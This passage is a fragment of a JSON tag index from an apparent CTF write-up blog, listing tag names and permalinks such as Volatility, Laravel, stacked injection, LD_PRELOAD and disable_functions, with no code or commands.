"http://tiaonmmn.github.io/tags/Windows/"},{"name":"Volatility","slug":"Volatility","permalink":"http://tiaonmmn.github.io/tags/Volatility/"},{"name":"SID","slug":"SID","permalink":"http://tiaonmmn.github.io/tags/SID/"},{"name":"Laravel","slug":"Laravel","permalink":"http://tiaonmmn.github.io/tags/Laravel/"},{"name":"Blade","slug":"Blade","permalink":"http://tiaonmmn.github.io/tags/Blade/"},{"name":"RuCTF","slug":"RuCTF","permalink":"http://tiaonmmn.github.io/tags/RuCTF/"},{"name":"Sanic","slug":"Sanic","permalink":"http://tiaonmmn.github.io/tags/Sanic/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://tiaonmmn.github.io/tags/MongoDB/"},{"name":"TCPDF","slug":"TCPDF","permalink":"http://tiaonmmn.github.io/tags/TCPDF/"},{"name":"Tornado","slug":"Tornado","permalink":"http://tiaonmmn.github.io/tags/Tornado/"},{"name":"堆叠注入","slug":"堆叠注入","permalink":"http://tiaonmmn.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"},{"name":"mb_substr","slug":"mb-substr","permalink":"http://tiaonmmn.github.io/tags/mb-substr/"},{"name":"mb_strpos","slug":"mb-strpos","permalink":"http://tiaonmmn.github.io/tags/mb-strpos/"},{"name":"Stego","slug":"Stego","permalink":"http://tiaonmmn.github.io/tags/Stego/"},{"name":"USB","slug":"USB","permalink":"http://tiaonmmn.github.io/tags/USB/"},{"name":"打印机","slug":"打印机","permalink":"http://tiaonmmn.github.io/tags/%E6%89%93%E5%8D%B0%E6%9C%BA/"},{"name":"Hexo","slug":"Hexo","permalink":"http://tiaonmmn.github.io/tags/Hexo/"},{"name":"nip.io","slug":"nip-io","permalink":"http://tiaonmmn.github.io/tags/nip-io/"},{"name":"Regex","slug":"Regex","permalink":"http://tiaonmmn.github.io/tags/Regex/"},{"name":"Balabala","slug":"Balabala","permalink":"http://tiaonmmn.github.io/tags/Balabala/"},{"name":"LD_PRELOAD","slug":"LD-PRELOAD","permalink":"http://tiaonmmn.github.io/tags/LD-PRELOAD/"},{"name":"disable_functions","slug":"disable-functions","permalink":"http://tiaonmmn.github.io/tags/disable-functions/"},{"name":"f-string","slug":"f-string","permalink":"http://tiaonmmn.github.io/tags/f-string/"},{"name":"Data URI Scheme","slug":"Data-URI-Scheme","permalink":"http://tiaonmmn.github.io/tags/Data-URI-Scheme/"},{"name":"CakePHP","slug":"CakePHP","permalink":"http://tiaonmmn.github.io/tags/CakePHP/"}]}